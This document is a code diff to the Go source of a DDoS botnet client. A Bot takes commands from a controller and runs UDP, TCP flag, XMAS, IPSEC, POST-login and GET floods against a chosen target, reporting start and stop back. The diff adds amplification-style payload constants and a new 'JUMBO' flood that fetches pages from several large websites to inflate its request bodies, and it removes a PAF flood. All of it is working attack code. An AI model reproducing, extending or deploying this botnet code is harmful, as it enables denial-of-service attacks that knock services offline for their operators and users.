@@ -6,9 +6,9 @@ import (
 )
 
 /*
-	GET header
+	GET flood Agents.
 */
-var httpAgent = []string{
+var httpAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
 	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,7 +32,7 @@ var httpAgent = []string{
 }
 
 /*
-	POST payload
+	POST login flood payloads.
 */
 var (
 	postPayload, _ = json.Marshal(map[string]string{
@@ -47,13 +47,23 @@ var (
 )
 
 /*
-	AMP payload
+	Other payloads.
 */
-var (
+const (
 	queryPrefix  = "\xff\xff\xff\xff"
 	vsePayload   = "\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
 	fmsPayload   = "\x67\x65\x74\x73\x74\x61\x74\x75\x73"
 	ipsecPayload = "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
+)
+
+/*
+	Increase more size of a jumbo flood.
+*/
+const (
+	apple = "https://www.apple.com"
+	weibo = "https://weibo.com"
+	qq    = "https://www.qq.com"
+	ebay  = "https://www.ebay.com"
 )
 
 func setAttackSwitch() {
@@ -70,7 +80,7 @@ func (b *Bot) UDP() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
+			ddosPayload:  setCall.CallAttack.ddosPayload,
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
@@ -84,7 +94,7 @@ func (b *Bot) UDP() {
 }
 
 func (b *Bot) TCP() {
-	storeOpt := strings.ToUpper(ComdSetup(4, "-"))
+	storeOpt := strings.ToUpper(setupComd(4, "-"))
 	b.Report("START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
 	if setCall, setKey := SetupCaller(); setKey {
 		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
@@ -92,7 +102,7 @@ func (b *Bot) TCP() {
 				srcAddr:      setCall.CallAttack.srcAddr,
 				dstAddr:      setCall.CallAttack.dstAddr,
 				dstPort:      setCall.CallAttack.dstPort,
-				ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
+				ddosPayload:  setCall.CallAttack.ddosPayload,
 				synFlag:      value.synFlag,
 				ackFlag:      value.ackFlag,
 				rstFlag:      value.rstFlag,
@@ -119,7 +129,7 @@ func (b *Bot) SAF() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
+			ddosPayload:  setCall.CallAttack.ddosPayload,
 			synFlag:      true,
 			ackFlag:      true,
 			attackSwitch: setCall.CallAttack.attackSwitch,
@@ -134,28 +144,6 @@ func (b *Bot) SAF() {
 	}
 }
 
-func (b *Bot) PAF() {
-	b.Report("START PAF FLOOD ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(); setKey {
-		a := &Attack{
-			srcAddr:      setCall.CallAttack.srcAddr,
-			dstAddr:      setCall.CallAttack.dstAddr,
-			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
-			pshFlag:      true,
-			ackFlag:      true,
-			attackSwitch: setCall.CallAttack.attackSwitch,
-			reportSwitch: setCall.CallAttack.reportSwitch,
-		}
-		a.tcpPacket()
-	}
-	if callSwitch, keySwitch := SetupCaller(); keySwitch {
-		if callSwitch.CallAttack.reportSwitch {
-			b.Report("STOP PAF FLOOD ATTACKING!!!")
-		}
-	}
-}
-
 func (b *Bot) XMAS() {
 	b.Report("START XMAS FLOOD ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
@@ -163,7 +151,7 @@ func (b *Bot) XMAS() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
+			ddosPayload:  setCall.CallAttack.ddosPayload,
 			synFlag:      true,
 			ackFlag:      true,
 			rstFlag:      true,
@@ -242,32 +230,12 @@ func (b *Bot) IPSEC() {
 	}
 }
 
-func (b *Bot) GET() {
-	b.Report("START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
-	if setCall, setKey := SetupCaller(); setKey {
-		a := &Attack{
-			url:          setCall.CallAttack.url,
-			httpMethod:   "GET",
-			reqHeader:    "user-agent",
-			attackSwitch: setCall.CallAttack.attackSwitch,
-			reportSwitch: setCall.CallAttack.reportSwitch,
-		}
-		a.getRequest()
-	}
-	if callSwitch, keySwitch := SetupCaller(); keySwitch {
-		if callSwitch.CallAttack.reportSwitch {
-			b.Report("STOP GET FLOOD ATTACKING!!!")
-		}
-	}
-}
-
 func (b *Bot) POLING() {
 	b.Report("START POLING FLOOD ATTACK: " + Recv(*BotReader, 4))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
-			httpMethod:   "POST",
-			reqHeader:    string(postPayload),
+			attackBody:   strings.NewReader(string(postPayload)),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
@@ -276,6 +244,50 @@ func (b *Bot) POLING() {
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("STOP POLING FLOOD ATTACKING!!!")
+		}
+	}
+}
+
+func (b *Bot) JUMBO() {
+	b.Report("START JUMBO FLOOD ATTACK: " + Recv(*BotReader, 4))
+	if setCall, setKey := SetupCaller(); setKey {
+		/*
+			Don't forget to set a pull file,
+			incase that you add more website to pull for a jumbo flood.
+		*/
+		pullWeb(".pull_apple", apple)
+		pullWeb(".pull_weibo", weibo)
+		pullWeb(".pull_qq", qq)
+		pullWeb(".pull_ebay", ebay)
+		a := &Attack{
+			url:          setCall.CallAttack.url,
+			attackBody:   strings.NewReader(string("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<s:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Header>\r\n<oversize>\r\n" + meow("/usr/bin/ssh") + meow("/usr/bin/sh") + meow("/usr/bin/curl") + meow("/usr/bin/tmux") + meow(".pull_apple") + meow(".pull_weibo") + meow(".pull_qq") + meow(".pull_ebay") + "</oversize>\r\n</soap:Header>\r\n<soap:Body>\r\n</soap:Body>\r\n</soap:Envelope>")),
+			attackSwitch: setCall.CallAttack.attackSwitch,
+			reportSwitch: setCall.CallAttack.reportSwitch,
+		}
+		a.postRequest()
+	}
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
+		if callSwitch.CallAttack.reportSwitch {
+			execComd("rm", "-rf", ".apple", ".weibo", ".qq", ".ebay")
+			b.Report("STOP JUMBO FLOOD ATTACKING!!!")
+		}
+	}
+}
+
+func (b *Bot) GET() {
+	b.Report("START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
+	if setCall, setKey := SetupCaller(); setKey {
+		a := &Attack{
+			url:          setCall.CallAttack.url,
+			attackSwitch: setCall.CallAttack.attackSwitch,
+			reportSwitch: setCall.CallAttack.reportSwitch,
+		}
+		a.getRequest()
+	}
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
+		if callSwitch.CallAttack.reportSwitch {
+			b.Report("STOP GET FLOOD ATTACKING!!!")
 		}
 	}
 }
